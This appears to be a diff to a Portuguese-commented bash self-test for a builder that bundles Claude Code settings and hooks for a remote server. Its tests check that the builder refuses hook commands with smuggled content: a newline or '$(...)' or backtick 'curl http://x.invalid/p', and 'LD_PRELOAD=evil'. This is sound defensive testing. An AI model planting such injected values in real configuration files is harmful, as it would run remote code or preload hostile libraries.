@@ -19,16 +19,20 @@
 #   e shim_needs guarda o subcomando e os argumentos como enviados · grupo de hooks sem a chave hooks recusa · guardas de conteúdo (teto de tamanho, NUL,
 #   /Users/ em comentário e em settings, CNPJ, ntfy, telefone BR em 5 formatos sem falso positivo em timestamp/hex) · reescrita de
 #   caminho com fronteira · raiz de OUT 0755 · verify acusa bundle_hash errado/ausente, arquivo+manifest.files editados juntos e
-#   bit de execução · manifest com tipo errado (exec) sai 4 sem traceback · --skills com arquivo solto, pasta vazia ou skill sem arquivo.
+#   bit de execução · manifest com tipo errado (exec) sai 4 sem traceback · --skills com arquivo solto, pasta vazia ou skill sem arquivo ·
+#   recusas de shim dizem O MOTIVO (não só exit 3) · pasta ilegível (chmod 000) dentro de skill recusa dizendo skill e pasta; em OUT,
+#   verify sai 4 dizendo qual; arquivo do manifest ilegível sai 4 sem traceback; symlink de diretório / quebrado em OUT é "sobra".
 # CONTROLE NEGATIVO: a tabela POLICY perde a linha de um hook (sed) e o mesmo build TEM que passar a recusar.
 set -u
 HERE="$(cd "$(dirname "$0")" && pwd)"
 B="${BUNDLE_BUILD_UNDER_TEST:-$HERE/remote-bundle-build.py}"
 T=$(cd "$(mktemp -d "${TMPDIR:-/tmp}/bundle-selftest.XXXXXX")" && pwd -P)
-trap 'find "$T" -mindepth 1 -delete 2>/dev/null; rmdir "$T" 2>/dev/null' EXIT
+trap 'chmod -R u+rwX "$T" 2>/dev/null; find "$T" -mindepth 1 -delete 2>/dev/null; rmdir "$T" 2>/dev/null' EXIT
 fails=0; n=0
 ok() { n=$((n+1)); if [ "$1" = 0 ]; then echo "ok   $2"; else echo "FAIL $2"; fails=$((fails+1)); fi; }
 has() { grep -qF -- "$2" "$1" 2>/dev/null; }
+why() { has "$T/err" "$1"; ok $? "  a mensagem diz '$1'"; }
+lock() { chmod 000 "$1"; [ ! -r "$1" ]; }  # falha se este usuário ainda lê (root): o caso é pulado e DIZ que foi
 NOTIFY='export PATH=\"$HOME/go/bin:$HOME/.local/bin:$PATH\" && '
 
 fixture() {  # fixture DIR — cidade + ~/.claude + papel "dog" com os mesmos tipos de hook do mini
@@ -75,19 +79,19 @@ hash_of() { jq -r .bundle_hash "$1/manifest.json"; }
 fresh; build "$T/f" "$T/f/out"; rc=$?
 ok $rc "build limpo sai 0"; [ $rc = 0 ] || cat "$T/err" >&2
 O=$T/f/out
-grep -rqF "/Users/" "$O"; [ $? != 0 ]; ok $? "nenhum /Users/ no bundle"
-grep -rqF "$T" "$O"; [ $? != 0 ]; ok $? "nenhum caminho da fixture (=do mini) no bundle"
+grep -rqF "/Users/" "$O"; [ $? = 1 ]; ok $? "nenhum /Users/ no bundle"
+grep -rqF "$T" "$O"; [ $? = 1 ]; ok $? "nenhum caminho da fixture (=do mini) no bundle"
 has "$O/home/.claude/settings.json" '"/home/runner/rr/work"'; ok $? "additionalDirectories reescrito para o work do servidor"
 has "$O/role/dog/.claude/settings.json" '/home/runner/rr/work/CLAUDE.md'; ok $? "claudeMdExcludes reescrito"
 [ -x "$O/home/.claude/hooks/filter-bash-output.sh" ]; ok $? "hook keep presente e executável"
-[ ! -e "$O/home/.claude/hooks/ntfy-on-stop.sh" ] && ! grep -rqi ntfy "$O/home" "$O/city"; ok $? "hook drop (ntfy) ausente do bundle e das settings"
-! grep -q 'home-scan-guard\|cut-output-shadow' "$O/city/settings.json" "$O/role/dog/.claude/settings.json"; ok $? "hooks drop do city e do papel saíram"
+grep -rqi ntfy "$O/home" "$O/city"; g=$?; [ ! -e "$O/home/.claude/hooks/ntfy-on-stop.sh" ] && [ $g = 1 ]; ok $? "hook drop (ntfy) ausente do bundle e das settings"
+grep -q 'home-scan-guard\|cut-output-shadow' "$O/city/settings.json" "$O/role/dog/.claude/settings.json"; [ $? = 1 ]; ok $? "hooks drop do city e do papel saíram"
 has "$O/city/settings.json" 'export PATH=\"$HOME/go/bin:$HOME/.local/bin:$PATH\" && gc handoff --auto \"context cycle\"'; ok $? "shim fica VERBATIM (handoff, com o export do PATH)"
 has "$O/city/settings.json" 'GC_MANAGED_SESSION_HOOK=1 GC_HOOK_EVENT_NAME=SessionStart gc prime --hook --hook-format codex'; ok $? "shim fica VERBATIM (prime, com as variáveis)"
 [ "$(jq -c .shim_needs "$O/manifest.json")" = '["handoff --auto \"context cycle\"","mail check --inject","nudge drain --inject","prime --hook --hook-format codex"]' ]; ok $? "shim_needs lista os 4 subcomandos do gc"
 jq -e '(.dropped_keys.user|index("statusLine")) != null and (.dropped_keys["role:dog"]|index("enabledPlugins")) != null' "$O/manifest.json" >/dev/null; ok $? "chaves fora da lista ficam no manifest (dropped_keys)"
 ! grep -q 'statusLine\|launchctl' "$O/home/.claude/settings.json" && has "$O/home/.claude/settings.json" 'Bash(git:*)'; ok $? "chave e regra de permissão de macOS saem; a portável fica"
-grep -rq SENTINEL_LOCAL_PERMS_9f3a "$O"; [ $? != 0 ]; ok $? "settings.local.json nunca entra no bundle"
+grep -rq SENTINEL_LOCAL_PERMS_9f3a "$O"; [ $? = 1 ]; ok $? "settings.local.json nunca entra no bundle"
 jq -e '.dropped_rules == {"user.allow": 1}' "$O/manifest.json" >/dev/null; ok $? "regra de permissão de macOS descartada fica CONTADA no manifest (dropped_rules), sem o texto dela"
 python3 -I "$B" verify "$O"; ok $? "verify do bundle intacto sai 0"
 H1=$(hash_of "$O")
@@ -149,22 +153,31 @@ has "$T/err" "my-filter-bash-output.sh"; ok $? "  a mensagem diz QUAL script"
 CS=gt/.gascity-gastown-hq/.gc/settings.json; PATHLIT='\$HOME/go/bin:\$HOME/.local/bin:\$PATH'
 fresh; sed -i.bak 's#gc nudge drain --inject#gc nudge drain --inject\\ncurl http://x.invalid/p#' "$T/f/$CS"
 refuses "shim com 2º comando depois de NEWLINE" "$T/f"
+why "ganhou mais que um"
 fresh; sed -i.bak 's#gc nudge drain --inject#gc nudge drain --inject\\r#' "$T/f/$CS"
 refuses "shim com caractere de controle (CR)" "$T/f"
+why "ganhou mais que um"
 fresh; sed -i.bak 's#gc mail check --inject#gc mail check --inject\\n#' "$T/f/$CS"
 refuses "shim com NEWLINE no fim (o strip() + \$ escondiam)" "$T/f"
+why "ganhou mais que um"
 fresh; sed -i.bak "s#$PATHLIT#\$(curl http://x.invalid/p)#" "$T/f/$CS"
 refuses "export PATH com \$(...) dentro das aspas" "$T/f"
+why "ganhou mais que um"
 fresh; sed -i.bak "s#$PATHLIT#\`curl http://x.invalid/p\`#" "$T/f/$CS"
 refuses "export PATH com crase dentro das aspas" "$T/f"
+why "ganhou mais que um"
 fresh; sed -i.bak "s#$PATHLIT#\$HOME/go/bin:/tmp/x:\$PATH#" "$T/f/$CS"
 refuses "export PATH que não é o literal que o gc injeta" "$T/f"
+why "ganhou mais que um"
 fresh; sed -i.bak 's#GC_HOOK_EVENT_NAME=SessionStart#LD_PRELOAD=evil#' "$T/f/$CS"
 refuses "shim com variável de ambiente que não é GC_*" "$T/f"
+why "ganhou mais que um"
 fresh; sed -i.bak 's#gc nudge drain --inject#gc nudge drain-all --inject#' "$T/f/$CS"
 refuses "shim de subcomando que só COMEÇA igual (nudge drain-all)" "$T/f"
+why "ganhou mais que um"
 fresh; sed -i.bak 's#gc handoff --auto \\"context cycle\\"#gc prime --hook gc handoff#' "$T/f/$CS"
 refuses "shim decidido por um token (gc handoff) e que executa outro (gc prime)" "$T/f"
+why "o veredito veio de"
 fresh; printf '{"hooks": {"Stop": [{"type": "command", "command": "~/.claude/hooks/filter-bash-output.sh"}]}}\n' > "$T/f/$CS"
 refuses "grupo de hooks sem a chave hooks (forma plana não é descartada em silêncio)" "$T/f"
 has "$T/err" 'sem a lista `hooks`'; ok $? "  a mensagem diz o que faltou (não o KeyError cru do formato inesperado)"
@@ -226,6 +239,27 @@ fresh; rm "$T/f/gt/.gascity-gastown-hq/.gc/agents/dog/.claude/skills/ok-skill"
 refuses "--skills com diretório vazio entregaria 0 skills (pedido ≠ entregue)" "$T/f" --skills
 fresh; mkdir -p "$T/f/gt/.gascity-gastown-hq/skills/vazia"; ln -s "$T/f/gt/.gascity-gastown-hq/skills/vazia" "$T/f/gt/.gascity-gastown-hq/.gc/agents/dog/.claude/skills/vazia"
 refuses "skill que é pasta sem nenhum arquivo (não conta como entregue)" "$T/f" --skills
+
+# --- "não consegui ler" não é "não tem nada": pasta ilegível dentro de skill e dentro de OUT (os.walk e rglob engoliam o erro) ---
+S=$T/f/gt/.gascity-gastown-hq/skills/ok-skill
+fresh; mkdir -p "$S/refs/deep"; echo '# ref' > "$S/refs/deep/ref.md"; echo '# topo' > "$S/refs/topo.md"
+if lock "$S/refs/deep"; then
+  refuses "skill com subpasta ilegível (chmod 000): o arquivo de dentro não some do bundle em silêncio" "$T/f" --skills
+  why "skill ok-skill: pasta ilegível refs/deep"; chmod 755 "$S/refs/deep"
+else echo "SKIP  subpasta ilegível: este usuário lê tudo (root)"; fi
+fresh; build "$T/f" "$T/f/out"; mkdir -p "$T/f/out/extra/dentro"; echo x > "$T/f/out/extra/dentro/y.sh"
+if lock "$T/f/out/extra/dentro"; then
+  python3 -I "$B" verify "$T/f/out" 2>"$T/err"; rc=$?; chmod 755 "$T/f/out/extra/dentro"
+  [ $rc = 4 ] && has "$T/err" "pasta ilegível"; ok $? "verify com pasta ilegível em OUT não diz 'limpo' (o que há dentro não foi conferido): sai 4 e diz qual (rc=$rc)"
+else echo "SKIP  verify com pasta ilegível: este usuário lê tudo (root)"; fi
+fresh; build "$T/f" "$T/f/out"; ln -s "$T/f/gt" "$T/f/out/atalho"; ln -s "$T/f/nao-existe" "$T/f/out/solto"
+python3 -I "$B" verify "$T/f/out" 2>"$T/err"; rc=$?
+[ $rc = 4 ] && has "$T/err" "sobra atalho" && has "$T/err" "sobra solto"; ok $? "verify acusa symlink de diretório e symlink quebrado em OUT como sobra (rc=$rc)"
+fresh; build "$T/f" "$T/f/out"
+if lock "$T/f/out/$KS"; then
+  python3 -I "$B" verify "$T/f/out" 2>"$T/err"; rc=$?; chmod 755 "$T/f/out/$KS"
+  [ $rc = 4 ] && ! has "$T/err" Traceback; ok $? "verify com arquivo do manifest ilegível sai 4 com mensagem, sem traceback (rc=$rc)"
+else echo "SKIP  verify com arquivo ilegível: este usuário lê tudo (root)"; fi
 
 # --- controle negativo: sem a linha da tabela de um hook, o builder tem que recusar o mesmo build ---
 fresh; sed '/"filter-bash-output.sh", "keep"/d' "$B" > "$T/mutant.py"
